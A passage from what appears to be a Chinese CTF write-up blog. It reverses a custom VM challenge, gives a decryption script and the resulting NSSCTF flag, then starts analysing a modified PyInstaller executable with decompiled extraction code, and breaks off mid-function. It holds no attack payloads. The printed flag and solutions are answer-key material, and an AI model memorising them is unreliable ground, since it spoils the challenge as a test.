<span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=31 | push A<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 11: <span class="hljs-attribute">IP</span>=13 | <span class="hljs-attribute">A</span>=53 <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=31 | load immediate 53<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 12: <span class="hljs-attribute">IP</span>=15 | <span class="hljs-attribute">A</span>=53 <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=53 | D = A<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 13: <span class="hljs-attribute">IP</span>=16 | <span class="hljs-attribute">A</span>=7F <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=53 | pop A<br>       Stack: []<br><span class="hljs-keyword">Step</span> 14: <span class="hljs-attribute">IP</span>=17 | <span class="hljs-attribute">A</span>=2C <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=53 | A -= D<br>       Stack: []<br><span class="hljs-keyword">Step</span> 15: <span class="hljs-attribute">IP</span>=18 | <span class="hljs-attribute">A</span>=2C <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=2C | D = A<br>       Stack: []<br><span class="hljs-keyword">Step</span> 16: <span class="hljs-attribute">IP</span>=19 | <span class="hljs-attribute">A</span>=53 <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=2C | load immediate 53<br>       Stack: []<br><span class="hljs-keyword">Step</span> 17: <span class="hljs-attribute">IP</span>=21 | <span class="hljs-attribute">A</span>=7F <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=2C | A ^= D<br>       Stack: []<br><span class="hljs-keyword">Step</span> 18: <span class="hljs-attribute">IP</span>=22 | <span class="hljs-attribute">A</span>=7F <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=2C | push A<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 19: <span class="hljs-attribute">IP</span>=23 | <span class="hljs-attribute">A</span>=00 <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=2C | A = B<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 20: <span class="hljs-attribute">IP</span>=24 | <span class="hljs-attribute">A</span>=01 <span class="hljs-attribute">B</span>=00 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=2C | A++<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 21: <span class="hljs-attribute">IP</span>=25 | <span class="hljs-attribute">A</span>=01 <span class="hljs-attribute">B</span>=01 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=2C | B = A<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 22: <span class="hljs-attribute">IP</span>=26 | <span class="hljs-attribute">A</span>=43 <span class="hljs-attribute">B</span>=01 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=2C | load immediate 43<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 23: <span class="hljs-attribute">IP</span>=28 | <span class="hljs-attribute">A</span>=43 <span class="hljs-attribute">B</span>=01 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=43 | D = A<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 24: <span class="hljs-attribute">IP</span>=29 | <span class="hljs-attribute">A</span>=32 <span class="hljs-attribute">B</span>=01 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=43 | A = input[1] = <span class="hljs-string">&#x27;2&#x27;</span> (32)<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 25: <span class="hljs-attribute">IP</span>=30 | <span class="hljs-attribute">A</span>=71 <span class="hljs-attribute">B</span>=01 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=43 | A ^= D<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 26: <span class="hljs-attribute">IP</span>=31 | <span class="hljs-attribute">A</span>=71 <span class="hljs-attribute">B</span>=01 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=71 | D = A<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 27: <span class="hljs-attribute">IP</span>=32 | <span class="hljs-attribute">A</span>=54 <span class="hljs-attribute">B</span>=01 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=71 | load immediate 54<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 28: <span class="hljs-attribute">IP</span>=34 | <span class="hljs-attribute">A</span>=C5 <span class="hljs-attribute">B</span>=01 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=71 | A += D<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 29: <span class="hljs-attribute">IP</span>=35 | <span class="hljs-attribute">A</span>=C5 <span class="hljs-attribute">B</span>=01 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=71 | push A<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>, <span class="hljs-string">&#x27;C5&#x27;</span>]<br><span class="hljs-keyword">Step</span> 30: <span class="hljs-attribute">IP</span>=36 | <span class="hljs-attribute">A</span>=46 <span class="hljs-attribute">B</span>=01 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=71 | load immediate 46<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>, <span class="hljs-string">&#x27;C5&#x27;</span>]<br><span class="hljs-keyword">Step</span> 31: <span class="hljs-attribute">IP</span>=38 | <span class="hljs-attribute">A</span>=46 <span class="hljs-attribute">B</span>=01 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=46 | D = A<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>, <span class="hljs-string">&#x27;C5&#x27;</span>]<br><span class="hljs-keyword">Step</span> 32: <span class="hljs-attribute">IP</span>=39 | <span class="hljs-attribute">A</span>=C5 <span class="hljs-attribute">B</span>=01 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=46 | pop A<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 33: <span class="hljs-attribute">IP</span>=40 | <span class="hljs-attribute">A</span>=7F <span class="hljs-attribute">B</span>=01 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=46 | A -= D<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 34: <span class="hljs-attribute">IP</span>=41 | <span class="hljs-attribute">A</span>=7F <span class="hljs-attribute">B</span>=01 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=46 | push A<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>, <span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 35: <span class="hljs-attribute">IP</span>=42 | <span class="hljs-attribute">A</span>=01 <span class="hljs-attribute">B</span>=01 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=46 | A = B<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>, <span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 36: <span class="hljs-attribute">IP</span>=43 | <span class="hljs-attribute">A</span>=02 <span class="hljs-attribute">B</span>=01 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=46 | A++<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>, <span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 37: <span class="hljs-attribute">IP</span>=44 | <span class="hljs-attribute">A</span>=02 <span class="hljs-attribute">B</span>=02 <span class="hljs-attribute">C</span>=19 <span class="hljs-attribute">D</span>=46 | B = A<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>, <span class="hljs-string">&#x27;7F&#x27;</span>]<br><span class="hljs-keyword">Step</span> 38: <span class="hljs-attribute">IP</span>=83 | <span class="hljs-attribute">A</span>=02 <span class="hljs-attribute">B</span>=02 <span class="hljs-attribute">C</span>=18 <span class="hljs-attribute">D</span>=46 | <span class="hljs-attribute">C--</span>=24, jump <span class="hljs-keyword">to</span> 83<br>       Stack: [<span class="hljs-string">&#x27;7F&#x27;</span>, <span class="hljs-string">&#x27;7F&#x27;</span>]<br></code></pre></td></tr></table></figure><p>里面加载了几个立即数,打印出来可以发现是 flag 的开头</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">data = [<span class="hljs-number">0x19</span>,<span class="hljs-number">0x4E</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x46</span>]<br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data])<br><br><span class="hljs-comment"># [&#x27;\x19&#x27;, &#x27;N&#x27;, &#x27;S&#x27;, &#x27;S&#x27;, &#x27;C&#x27;, &#x27;T&#x27;, &#x27;F&#x27;]</span><br></code></pre></td></tr></table></figure><h4 id="分析-解密"><a href="#分析-解密" class="headerlink" title="分析 解密"></a>分析 解密</h4><p>同时还可以看出对奇数索引和偶数索引的处理方式不同<br>input[0] (偶数索引) </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">A = <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[0]</span><br>D = <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[0]</span><br>A = <span class="hljs-number">0</span>x4E<br>A = <span class="hljs-number">0</span>x4E + <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[0]</span><br>A = <span class="hljs-number">0</span>x4E + <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[0]</span> - <span class="hljs-number">0</span>x53<br>   = <span class="hljs-selector-tag">input</span> - <span class="hljs-number">0</span>x05<br>D = <span class="hljs-selector-tag">input</span> - <span class="hljs-number">0</span>x05<br>A = <span class="hljs-number">0</span>x53 ^ (<span class="hljs-selector-tag">input</span> - <span class="hljs-number">0</span>x05) <br></code></pre></td></tr></table></figure><p>input[1] (奇数索引)</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">A = <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[1]</span><br>A = <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[1]</span> ^ <span class="hljs-number">0</span>x43<br>D = <span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[1]</span> ^ <span class="hljs-number">0</span>x43<br>A = <span class="hljs-number">0</span>x54 + （<span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[1]</span> ^ <span class="hljs-number">0</span>x43）<br>A = <span class="hljs-number">0</span>x54 + （<span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[1]</span> ^ <span class="hljs-number">0</span>x43）- <span class="hljs-number">0</span>x46<br>   = <span class="hljs-number">0</span>x0E + （<span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[1]</span> ^ <span class="hljs-number">0</span>x43）<br></code></pre></td></tr></table></figure><p>总结出来加密逻辑大概是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> ==<span class="hljs-number">0</span>:<br>   enc[i] = (<span class="hljs-built_in">input</span>[i] - <span class="hljs-number">0x05</span>) ^ <span class="hljs-number">0x53</span><br><span class="hljs-keyword">else</span>:<br>   enc[i] = (<span class="hljs-built_in">input</span>[i] ^ <span class="hljs-number">0x43</span>) + <span class="hljs-number">0x0E</span><br></code></pre></td></tr></table></figure><p>那么解密就应该是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>   dec[i] = (enc[i] ^ <span class="hljs-number">0x53</span>) + <span class="hljs-number">0x05</span><br><span class="hljs-keyword">else</span>:<br>   dec[i] = (enc[i] - <span class="hljs-number">0x0E</span>) ^ <span class="hljs-number">0x43</span><br></code></pre></td></tr></table></figure><p>从 C 的值可以看出，一共有 0x19(25) 轮加密，一次加密两个字符，而刚好 cmp_data 的长度为50<br>解密脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py">enc = [<br>    <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x78</span>, <br>    <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x45</span>, <br>    <span class="hljs-number">0x37</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x3D</span>, <br>    <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x7E</span>, <br>    <span class="hljs-number">0x09</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x09</span>, <br>    <span class="hljs-number">0x43</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x4C</span><br>]<br><span class="hljs-comment"># print(len(cmp_data))</span><br>dec = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>        dec.append((enc[i] ^ <span class="hljs-number">0x53</span>) + <span class="hljs-number">0x05</span>)<br>    <span class="hljs-keyword">else</span>:<br>        dec.append((enc[i] - <span class="hljs-number">0x0E</span>) ^ <span class="hljs-number">0x43</span>)<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> dec)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>flag 为 <code>NSSCTF&#123;C0ngr@tulation!Y0N_s33m_7o_b3_gO0d_@t_vm!!&#125;</code></p><h3 id="CrackMe-F-Me"><a href="#CrackMe-F-Me" class="headerlink" title="CrackMe&amp;F***Me"></a>CrackMe&amp;F***Me</h3><p>开始做的时候给我看得一头雾水，找不到方向，梳理做完之后还是有收获的 （<del>讨厌这个出题人.jpg</del>）</p><h4 id="魔改-PyInstaller"><a href="#魔改-PyInstaller" class="headerlink" title="魔改 PyInstaller"></a>魔改 PyInstaller</h4><p>附件(改名为 crack.exe了) 用 DIE 查看是 PyInstaller 打包的，起初直接用工具 pyinstxtractor-2025.02 解包失败了<br><code>python pyinstxtractor.py crack.exe</code><br>报错如下</p><p><img src="/../images/NSS2025/k1.png"></p><p>Missing cookie 说明 exe 中找不到 PyInstaller 的标识<br>然后就尝试用 010 editor 来修复文件，找了两能够被正常解包的 python 程序来进行对比，最后发现这样改成这样的话是能够被识别然后解包的(解包时用与打包相同的 python 版本，此处是用的 3.8)</p><p><img src="/../images/NSS2025/k2.png"></p><p>再次解包，仍然有报错</p><p><img src="/../images/NSS2025/k3.png"></p><p>成功识别 PyInstaller 版本，但在解压 exe 内部的模块是发生错误</p><p>解决办法仍是把这个程序和正常打包的 python 程序在 ida 中进行对比，观察哪个函数进行了魔改，从头对比，观察到在 sub_140001450 处函数的地址不一样了，说明上个函数(sub_1400011F0)就是被魔改的函数</p><p><img src="/../images/NSS2025/k4.png"></p><p>魔改的 sub_1400011F0</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_1400011F0</span><span class="hljs-params">(FILE *Stream_1, __int64 a2, FILE *Stream_2, <span class="hljs-type">char</span> *a4)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">void</span> *Buffer_2; <span class="hljs-comment">// rbp</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v8; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v9; <span class="hljs-comment">// r12d</span><br>  __m128i *Buffer; <span class="hljs-comment">// r15</span><br>  <span class="hljs-type">int</span> *v12; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> *v13; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// edi</span><br>  <span class="hljs-type">unsigned</span> __int64 n0x4000_1; <span class="hljs-comment">// r13</span><br>  __m128 si128; <span class="hljs-comment">// xmm6</span><br>  <span class="hljs-type">size_t</span> n0x4000; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">unsigned</span> __int64 n0x4000_4; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">const</span> __m128i *v19; <span class="hljs-comment">// rax</span><br>  __m128 v20; <span class="hljs-comment">// xmm0</span><br>  __m128i *v21; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">size_t</span> v22; <span class="hljs-comment">// rcx</span><br>  <span class="hljs-type">int</span> n2; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> n2_1; <span class="hljs-comment">// edi</span><br>  <span class="hljs-type">size_t</span> ElementCount; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">int</span> v26; <span class="hljs-comment">// [rsp+20h] [rbp-B8h]</span><br>  __m128i *p_Buffer; <span class="hljs-comment">// [rsp+30h] [rbp-A8h] BYREF</span><br>  <span class="hljs-type">int</span> n0x4000_2; <span class="hljs-comment">// [rsp+38h] [rbp-A0h]</span><br>  <span class="hljs-type">void</span> *Buffer_3; <span class="hljs-comment">// [rsp+40h] [rbp-98h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> n0x4000_3; <span class="hljs-comment">// [rsp+48h] [rbp-90h]</span><br>  __int64 v31; <span class="hljs-comment">// [rsp+60h] [rbp-78h]</span><br>  __int64 v32; <span class="hljs-comment">// [rsp+68h] [rbp-70h]</span><br>  __int64 v33; <span class="hljs-comment">// [rsp+70h] [rbp-68h]</span><br><br>  v31 = <span class="hljs-number">0</span>;<br>  v32 = <span class="hljs-number">0</span>;<br>  v33 = <span class="hljs-number">0</span>;<br>  n0x4000_2 = <span class="hljs-number">0</span>;<br>  Buffer_2 = <span class="hljs-number">0</span>;<br>  p_Buffer = <span class="hljs-number">0</span>;<br>  v8 = <span class="hljs-built_in">sub_14000C390</span>(&amp;p_Buffer, <span class="hljs-string">&quot;1.3.1&quot;</span>, <span class="hljs-number">88</span>);<br>  v9 = v8;<br>  <span class="hljs-keyword">if</span> ( v8 )<br>  &#123;<br>    <span class="hljs-built_in">sub_140003390</span>(<span class="hljs-string">&quot;Failed to extract %s: inflateInit() failed with return code %d!\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(a2 + <span class="hljs-number">18</span>), v8);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFFLL</span>;<br>  &#125;<br>  Buffer = (__m128i *)<span class="hljs-built_in">j__malloc_base</span>(<span class="hljs-number">0x4000u</span>);<br>  <span class="hljs-keyword">if</span> ( Buffer )<br>  &#123;<br>    Buffer_2 = <span class="hljs-built_in">j__malloc_base</span>(<span class="hljs-number">0x4000u</span>);<br>    <span class="hljs-keyword">if</span> ( !Buffer_2 )<br>    &#123;<br>      v13 = <span class="hljs-built_in">errno</span>();<br>      <span class="hljs-built_in">sub_140003560</span>(<br>        <span class="hljs-string">&quot;malloc&quot;</span>,<br>        (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)*v13,<br>        <span class="hljs-string">&quot;Failed to extract %s: failed to allocate temporary output buffer!\n&quot;</span>,<br>        (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(a2 + <span class="hljs-number">18</span>));<br>      <span class="hljs-keyword">goto</span> LABEL_42;<br>    &#125;<br>    v9 = <span class="hljs-number">-1</span>;<br>    v14 = <span class="hljs-number">1</span>;<br>    n0x4000_1 = *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)(a2 + <span class="hljs-number">8</span>);<br>    si128 = (__m128)_mm_load_si128((<span class="hljs-type">const</span> __m128i *)&amp;xmmword_14002EA50);<br>    v26 = <span class="hljs-number">1</span>;<br>LABEL_8:<br>    n0x4000 = n0x4000_1;<br>    <span class="hljs-keyword">if</span> ( n0x4000_1 &gt; <span class="hljs-number">0x4000</span> )<br>      n0x4000 = <span class="hljs-number">0x4000</span>;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">fread</span>(Buffer, <span class="hljs-number">1u</span>, n0x4000, Stream_1) != n0x4000 || <span class="hljs-built_in">ferror</span>(Stream_1) )<br>      <span class="hljs-keyword">goto</span> LABEL_42;<br>    n0x4000_1 -= n0x4000;<br>    <span class="hljs-keyword">if</span> ( !v14 )<br>    &#123;<br>LABEL_26:<br>      n0x4000_2 = n0x4000;<br>      p_Buffer = Buffer;<br>      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>      &#123;<br>        Buffer_3 = Buffer_2;<br>        n0x4000_3 = <span class="hljs-number">0x4000</span>;<br>        n2 = <span class="hljs-built_in">sub_14000A7D0</span>(&amp;p_Buffer, <span class="hljs-number">0</span>);<br>        n2_1 = n2;<br>        v9 = <span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(n2 + <span class="hljs-number">4</span>) &lt;= <span class="hljs-number">2</span> )<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span> ( n2 == <span class="hljs-number">2</span> )<br>        &#123;<br>          n2_1 = <span class="hljs-number">-3</span>;<br>          <span class="hljs-keyword">break</span>;<br>        &#125;<br>        ElementCount = <span class="hljs-number">0x4000LL</span> - n0x4000_3;<br>        <span class="hljs-keyword">if</span> ( Stream_2 )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">fwrite</span>(Buffer_2, <span class="hljs-number">1u</span>, ElementCount, Stream_2) != ElementCount || <span class="hljs-built_in">ferror</span>(Stream_2) )<br>          &#123;<br>            n2_1 = <span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">break</span>;<br>          &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( a4 )<br>        &#123;<br>          <span class="hljs-built_in">memcpy</span>(a4, Buffer_2, ElementCount);<br>          a4 += ElementCount;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ( n0x4000_3 )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( n2_1 == <span class="hljs-number">1</span> )<br>          &#123;<br>            v9 = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">goto</span> LABEL_42;<br>          &#125;<br>          <span class="hljs-keyword">if</span> ( n0x4000_1 )<br>          &#123;<br>           